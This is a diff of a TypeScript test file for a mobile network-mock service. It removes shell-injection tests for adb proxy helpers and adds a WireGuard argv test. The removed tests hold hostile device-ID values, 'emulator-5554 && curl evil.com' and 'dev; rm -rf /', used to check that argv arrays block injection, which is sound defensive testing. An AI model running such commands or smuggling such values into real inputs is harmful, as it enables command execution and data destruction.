@@ -6,7 +6,6 @@
  *   ITEM 4 — iOS rejected loudly
  *   ITEM 5 — object body in validate.ts JSON-stringified
  *   FIX 1 — signal handler deregisters the "exit" listener (cleanup runs once)
- *   FIX 2 — device-proxy adb calls use an argv array (no shell injection)
  *   FIX 3 — array body JSON-stringified ([1,2,3] not "1,2,3")
  */
 import { test } from "node:test";
@@ -14,7 +13,10 @@ import assert from "node:assert/strict";
 import { validateVisualFlow } from "../mcp/visual-flow/index.js";
 import { stripPlatformPrefix } from "../mcp/server.js";
 import { NetworkMockService } from "../mcp/network-mocks/NetworkMockService.js";
-import { configureDeviceProxy, removeDeviceProxy, buildSetProxyArgs } from "../mcp/network-mocks/device-proxy.js";
+import {
+  buildPushWireGuardProfileArgs,
+  buildWireGuardToggleArgs,
+} from "../mcp/network-mocks/device-proxy.js";
 
 // ─── ITEM 1: stripPlatformPrefix ──────────────────────────────────────────────
 
@@ -98,7 +100,7 @@ test("TTL: armTtl replaces any existing timer (no double-registration)", () => {
 test("exit failsafe: signal handler removes the 'exit' listener so cleanup can't double-fire", () => {
   const svc = new NetworkMockService() as any;
   // Pretend a mock is active so the exit handler would do work.
-  svc.activeConfig = { platform: "android", deviceId: "emulator-5554" };
+  svc.activeConfig = { deviceId: "emulator-5554" };
   const beforeExit = process.listenerCount("exit");
   const beforeInt = process.listenerCount("SIGINT");
   const beforeTerm = process.listenerCount("SIGTERM");
@@ -118,7 +120,7 @@ test("exit failsafe: signal handler removes the 'exit' listener so cleanup can't
 
 test("exit failsafe: stop() removes all process listeners (suite exits clean)", async () => {
   const svc = new NetworkMockService() as any;
-  svc.activeConfig = { platform: "android", deviceId: "emulator-5554" };
+  svc.activeConfig = { deviceId: "emulator-5554" };
   const beforeExit = process.listenerCount("exit");
   svc._registerExitFailsafe();
   assert.equal(process.listenerCount("exit"), beforeExit + 1);
@@ -225,42 +227,13 @@ test("validate: array body is JSON-stringified to '[1,2,3]' (not '1,2,3')", () =
   }
 });
 
-// ─── FIX 2: device-proxy adb calls use an argv array (no shell injection) ─────
-
-test("buildSetProxyArgs: deviceId is a discrete argv element, not a shell string", () => {
-  const evil = "emulator-5554 && curl evil.com";
-  const args = buildSetProxyArgs(evil, "10.0.2.2:8080");
-  // The malicious deviceId appears verbatim as ONE element — never split/joined into a shell string
-  assert.ok(args.includes(evil), "deviceId must be passed verbatim as one argv element");
-  assert.equal(args[0], "-s");
-  assert.equal(args[1], evil);
-  // No element is a single joined shell command line
-  assert.ok(!args.some((a) => a.includes("&&") && a.includes("adb")), "no joined shell command");
-});
-
-test("configureDeviceProxy: runner receives adb + argv array; metachar deviceId is not shell-interpreted", () => {
-  const calls: Array<{ file: string; args: string[] }> = [];
-  const evil = "dev; rm -rf /";
-  configureDeviceProxy(
-    { platform: "android", deviceId: evil, proxyHost: "10.0.2.2", proxyPort: 8080 },
-    (file, args) => { calls.push({ file, args }); },
-  );
-  assert.equal(calls.length, 1);
-  assert.equal(calls[0]!.file, "adb");
-  // deviceId is one discrete argv element, so the shell never sees "; rm -rf /"
-  assert.ok(calls[0]!.args.includes(evil), "evil deviceId stays one argv element");
-  assert.deepEqual(calls[0]!.args, ["-s", evil, "shell", "settings", "put", "global", "http_proxy", "10.0.2.2:8080"]);
-});
-
-test("removeDeviceProxy: runner receives the clear-proxy argv for android", () => {
-  const calls: Array<{ file: string; args: string[] }> = [];
-  removeDeviceProxy("android", "emulator-5554", (file, args) => { calls.push({ file, args }); });
-  assert.equal(calls.length, 1);
-  assert.deepEqual(calls[0]!.args, ["-s", "emulator-5554", "shell", "settings", "put", "global", "http_proxy", ":0"]);
-});
-
-test("removeDeviceProxy: ios is a no-op (no adb call)", () => {
-  const calls: Array<{ file: string; args: string[] }> = [];
-  removeDeviceProxy("ios", "some-udid", (file, args) => { calls.push({ file, args }); });
-  assert.equal(calls.length, 0, "ios must not invoke adb");
+test("wireguard: builds profile push and remote toggle argv", () => {
+  assert.deepEqual(buildPushWireGuardProfileArgs("phone", "/tmp/preflight.conf", "/sdcard/Download/preflight.conf"), [
+    "-s", "phone", "push", "/tmp/preflight.conf", "/sdcard/Download/preflight.conf",
+  ]);
+  assert.deepEqual(buildWireGuardToggleArgs("phone", "up", "preflight-mock"), [
+    "-s", "phone", "shell", "am", "broadcast",
+    "-n", "com.wireguard.android/.model.TunnelManager$IntentReceiver",
+    "-a", "com.wireguard.android.action.SET_TUNNEL_UP", "--es", "tunnel", "preflight-mock",
+  ]);
 });
